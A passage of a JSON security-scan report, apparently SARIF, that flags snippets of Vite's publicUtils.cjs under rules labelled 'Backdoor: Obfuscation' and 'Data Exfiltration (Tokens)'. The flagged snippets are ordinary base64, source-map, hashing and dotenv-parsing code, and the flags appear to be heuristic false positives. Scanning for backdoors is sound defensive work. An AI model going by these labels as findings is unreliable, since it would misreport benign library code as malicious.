                      "text": "\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n}\n\n",
                      "markdown": "`\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 4248,
                  "startColumn": 54,
                  "endLine": 4248,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n",
                    "rendered": {
                      "text": "\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n",
                      "markdown": "`\tif (typeof globalThis !== 'undefined' && typeof globalThis.btoa === 'function') {\n\t\treturn (str) => globalThis.btoa(unescape(encodeURIComponent(str)));\n\t} else if (typeof Buffer === 'function') {\n\t\treturn (str) => Buffer.from(str, 'utf-8').toString('base64');\n\t} else {\n\t\treturn () => {\n\t\t\tthrow new Error('Unsupported environment: `window.btoa` or `Buffer` should be supported.');\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3965,
                  "startColumn": 13,
                  "endLine": 3965,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  var hash = crypto$1\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n",
                    "rendered": {
                      "text": "  var hash = crypto$1\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n",
                      "markdown": "`  var hash = crypto$1\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3852,
                  "startColumn": 45,
                  "endLine": 3852,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                    "rendered": {
                      "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                      "markdown": "`\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3852,
                  "startColumn": 24,
                  "endLine": 3852,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                    "rendered": {
                      "text": "\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n",
                      "markdown": "`\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n\texports.fromComment = function (comment) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3851,
                  "startColumn": 32,
                  "endLine": 3851,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n",
                    "rendered": {
                      "text": "\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n",
                      "markdown": "`\t  return new Converter(uri, { encoding: 'uri' });\n\t};\n\n\texports.fromBase64 = function (base64) {\n\t  return new Converter(base64, { encoding: 'base64' });\n\t};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3813,
                  "startColumn": 18,
                  "endLine": 3813,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n",
                    "rendered": {
                      "text": "\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n",
                      "markdown": "`\t    encoding = '';\n\t    content = this.toURI();\n\t  } else {\n\t    encoding = ';base64';\n\t    content = this.toBase64();\n\t  }\n\t  data = 'sourceMappingURL=data:application/json;charset=utf-8' + encoding + ',' + content;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3794,
                  "startColumn": 45,
                  "endLine": 3794,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n",
                    "rendered": {
                      "text": "\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n",
                      "markdown": "`\t  if (typeof json === 'number') {\n\t    throw new TypeError('The json to encode must not be of type number.');\n\t  }\n\t  return new Buffer(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithBtoa() {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3786,
                  "startColumn": 46,
                  "endLine": 3786,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n",
                    "rendered": {
                      "text": "\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n",
                      "markdown": "`\n\tfunction encodeBase64WithBufferFrom() {\n\t  var json = this.toJSON();\n\t  return Buffer.from(json, 'utf8').toString('base64');\n\t}\n\n\tfunction encodeBase64WithNewBuffer() {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3757,
                  "startColumn": 26,
                  "endLine": 3757,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n",
                    "rendered": {
                      "text": "\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n",
                      "markdown": "`\t    sm = stripComment(sm);\n\t  }\n\n\t  if (opts.encoding === 'base64') {\n\t    sm = decodeBase64(sm);\n\t  } else if (opts.encoding === 'uri') {\n\t    sm = decodeURIComponent(sm);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3722,
                  "startColumn": 41,
                  "endLine": 3722,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n\tfunction stripComment(sm) {\n",
                    "rendered": {
                      "text": "\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n\tfunction stripComment(sm) {\n",
                      "markdown": "`\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n\tfunction stripComment(sm) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3721,
                  "startColumn": 31,
                  "endLine": 3721,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n",
                    "rendered": {
                      "text": "\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n",
                      "markdown": "`\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n\t  return decodeURIComponent(escape(atob(base64)));\n\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3718,
                  "startColumn": 30,
                  "endLine": 3718,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n",
                    "rendered": {
                      "text": "\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n",
                      "markdown": "`\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3718,
                  "startColumn": 21,
                  "endLine": 3718,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n",
                    "rendered": {
                      "text": "\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n",
                      "markdown": "`\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n\t  return new Buffer(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithAtob(base64) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3714,
                  "startColumn": 36,
                  "endLine": 3714,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n",
                    "rendered": {
                      "text": "\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n",
                      "markdown": "`\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n\t  if (typeof value === 'number') {\n\t    throw new TypeError('The value to decode must not be of type number.');\n\t  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3711,
                  "startColumn": 31,
                  "endLine": 3711,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n",
                    "rendered": {
                      "text": "\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n",
                      "markdown": "`\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3711,
                  "startColumn": 22,
                  "endLine": 3711,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n",
                    "rendered": {
                      "text": "\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n",
                      "markdown": "`\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n\tfunction decodeBase64WithNewBuffer(base64) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3710,
                  "startColumn": 37,
                  "endLine": 3710,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\t  decodeBase64 = decodeBase64WithAtob;\n\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n",
                    "rendered": {
                      "text": "\t  decodeBase64 = decodeBase64WithAtob;\n\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n",
                      "markdown": "`\t  decodeBase64 = decodeBase64WithAtob;\n\t}\n\n\tfunction decodeBase64WithBufferFrom(base64) {\n\t  return Buffer.from(base64, 'base64').toString();\n\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3687,
                  "startColumn": 116,
                  "endLine": 3687,
                  "endColumn": 122,
                  "snippet": {
                    "text": "\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n",
                    "rendered": {
                      "text": "\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n",
                      "markdown": "`\tObject.defineProperty(exports, 'commentRegex', {\n\t  get: function getCommentRegex () {\n\t    // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data.\n\t    return /^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg;\n\t  }\n\t});\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5781,
                  "startColumn": 38,
                  "endLine": 5781,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
                      "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3600,
                  "startColumn": 16,
                  "endLine": 3600,
                  "endColumn": 21,
                  "snippet": {
                    "text": "}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n",
                    "rendered": {
                      "text": "}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n",
                      "markdown": "`}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6026,
                  "startColumn": 48,
                  "endLine": 6026,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                    "rendered": {
                      "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                      "markdown": "`        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6026,
                  "startColumn": 23,
                  "endLine": 6026,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                    "rendered": {
                      "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                      "markdown": "`        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5773,
                  "startColumn": 18,
                  "endLine": 5773,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
                      "text": "  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
